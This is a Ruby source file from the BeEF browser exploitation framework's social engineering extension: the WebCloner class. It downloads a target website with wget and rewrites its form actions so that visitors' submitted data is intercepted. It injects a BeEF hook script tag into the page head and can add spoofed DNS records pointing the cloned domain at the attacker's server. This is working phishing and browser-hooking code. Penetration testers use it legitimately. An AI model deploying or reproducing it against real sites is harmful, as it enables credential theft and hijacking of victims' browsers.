#
# Copyright (c) 2006-2022 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Extension
    module SocialEngineering
      class WebCloner
        require 'socket'
        include Singleton

        def initialize
          @http_server = BeEF::Core::Server.instance
          @config = BeEF::Core::Configuration.instance
          @cloned_pages_dir = "#{File.expand_path('../../../../extensions/social_engineering/web_cloner', __FILE__)}/cloned_pages/"
          @beef_hook = "#{@config.hook_url}"
        end

        def clone_page(url, mount, use_existing, dns_spoof)
          print_info "Cloning page at URL #{url}"
          uri = URI(url)
          output = uri.host
          output_mod = "#{output}_mod"
          user_agent = @config.get('beef.extension.social_engineering.web_cloner.user_agent')

          success = false

          # Sometimes pages use Javascript/custom logic to submit forms. In these cases even having a powerful parser,
          # there is no need to implement the complex logic to handle all different cases.
          # We want to leave the task to modify the xxx_mod file to the BeEF user, and serve it through BeEF after modification.
          # So ideally, if the the page needs custom modifications, the web_cloner usage will be the following:
          # 1th request. {"uri":"http://example.com", "mount":"/"} <- clone the page, and create the example.com_mod file
          # - the user modify the example.com_mod file manually
          # 2nd request. {"uri":"http://example.com", "mount":"/", "use_existing":"true"} <- serve the example.com_mod file
          #
          if use_existing.nil? || use_existing == false
            begin #,"--background"
              cmd = ["wget", "#{url}", "-c", "-k", "-O", "#{@cloned_pages_dir + output}", "-U", "#{user_agent}", '--read-timeout', '60', '--tries', '3']
              if not @config.get('beef.extension.social_engineering.web_cloner.verify_ssl')
                cmd << "--no-check-certificate"
              end
              print_debug "Running command: #{cmd.join(' ')}"
              IO.popen(cmd, 'r+') do |wget_io|
              end
              success = true
            rescue Errno::ENOENT => e
              print_error "Looks like wget is not in your PATH. If 'which wget' returns null, it means you don't have 'wget' in your PATH."
            rescue => e
              print_error "Errors executing wget: #{e}"
            end

            if success
              File.open("#{@cloned_pages_dir + output_mod}", 'w') do |out_file|
                File.open("#{@cloned_pages_dir + output}", 'r').each do |line|
                  # Modify the <form> line changing the action URI to / in order to be properly intercepted by BeEF
                  if line.include?("<form ") || line.include?("<FORM ")
                    line_attrs = line.split(" ")
                    c = 0
                    cc = 0
                    #todo: probably doable also with map!
                    # modify the form 'action' attribute
                    line_attrs.each do |attr|
                      if attr.include? "action=\""
                        print_info "Form action found: #{attr}"
                        break
                      end
                      c += 1
                    end
                    line_attrs[c] = "action=\"#{mount}\""

                    #todo: to be tested, needed in case like yahoo
                    # delete the form 'onsubmit' attribute
                    #line_attrs.each do |attr|
                    #  if attr.include? "onsubmit="
                    #    print_info "Form onsubmit event found: #{attr}"
                    #    break
                    #  end
                    #  cc += 1
                    #end
                    #line_attrs[cc] = ""

                    mod_form = line_attrs.join(" ")
                    print_info "Form action value changed in order to be intercepted :-D"
                    out_file.print mod_form
                    # Add the BeEF hook
                  elsif (line.include?("</head>") || line.include?("</HEAD>")) && @config.get('beef.extension.social_engineering.web_cloner.add_beef_hook')
                    out_file.print add_beef_hook(line)
                    print_info "BeEF hook added :-D"
                  else
                    out_file.print line
                  end
                end
              end
            end
          end

          if File.size("#{@cloned_pages_dir + output}") > 0
            print_info "Page at URL [#{url}] has been cloned. Modified HTML in [cloned_paged/#{output_mod}]"

            file_path = @cloned_pages_dir + output_mod # the path to the cloned_pages directory where we have the HTML to serve

            # if the user wants to clone http://a.com/login.jsp?cas=true&ciccio=false , split the URL mounting only the path.
            # then the phishing link can be used anyway with all the proper parameters to looks legit.
            if mount.include?("?")
              mount = mount.split("?").first
              print_info "Normalizing mount point. You can still use params for the phishing link."
            end

            # Check if the original URL can be framed
            frameable = is_frameable(url)

            interceptor = BeEF::Extension::SocialEngineering::Interceptor
            interceptor.set :redirect_to, url
            interceptor.set :frameable, frameable
            interceptor.set :beef_hook, @beef_hook
            interceptor.set :cloned_page, get_page_content(file_path)
            interceptor.set :db_entry, persist_page(url, mount)

            # Add a DNS record spoofing the address of the cloned webpage as the BeEF server
            if dns_spoof
              dns = BeEF::Extension::Dns::Server.instance
              ipv4 = Socket.ip_address_list.detect { |ai| ai.ipv4? && !ai.ipv4_loopback? }.ip_address
              ipv6 = Socket.ip_address_list.detect { |ai| ai.ipv6? && !ai.ipv6_loopback? }.ip_address
              ipv6.gsub!(/%\w*$/, '')
              domain = url.gsub(%r{^http://}, '')

              dns.add_rule(
                :pattern  => domain,
                :resource => Resolv::DNS::Resource::IN::A,
                :response => ipv4
              ) unless ipv4.nil?

              dns.add_rule(
                :pattern  => domain,
                :resource => Resolv::DNS::Resource::IN::AAAA,
                :response => ipv6
              ) unless ipv6.nil?

              print_info "DNS records spoofed [A: #{ipv4} AAAA: #{ipv6}]"
            end

            print_info "Mounting cloned page on URL [#{mount}]"
            @http_server.mount("#{mount}", interceptor.new)
            @http_server.remap

            success = true
          else
            print_error "Error cloning #{url}. Be sure that you don't have errors while retrieving the page with 'wget'."
            success = false
          end

          success
        end

        private
        # Replace </head> with <BeEF_hook></head>
        def add_beef_hook(line)
          if line.include?("</head>")
            line.gsub!("</head>", "<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</head>")
          elsif line.gsub!("</HEAD>", "<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</HEAD>")
          end
          line
        end

        private
        # check if the original URL can be framed. NOTE: doesn't check for framebusting code atm
        def is_frameable(url)
          result = true
          begin
            uri = URI(url)
            http = Net::HTTP.new(uri.host, uri.port)
            if uri.scheme == "https"
              http.use_ssl = true
              if not @config.get('beef.extension.social_engineering.web_cloner.verify_ssl')
                http.verify_mode = OpenSSL::SSL::VERIFY_NONE
              end
            end
            request = Net::HTTP::Get.new(uri.request_uri)
            response = http.request(request)
            frame_opt = response["X-Frame-Options"]

            if frame_opt != nil
              if frame_opt.casecmp("DENY") == 0 || frame_opt.casecmp("SAMEORIGIN") == 0
                result = false
              end
            end
            print_info "Page can be framed: [#{result}]"
          rescue => e
            result = false
            print_error "Unable to determine if page can be framed. Page can be framed: [#{result}]"
            print_debug e
            #print_debug e.backtrace
          end
          result
        end

        def get_page_content(file_path)
          file = File.open(file_path, 'r')
          cloned_page = file.read
          file.close
          cloned_page
        end

        def persist_page(uri, mount)
          webcloner_db = BeEF::Core::Models::WebCloner.new(
              :uri => uri,
              :mount => mount
          )
          webcloner_db.save
          webcloner_db
        end

      end
    end
  end
end

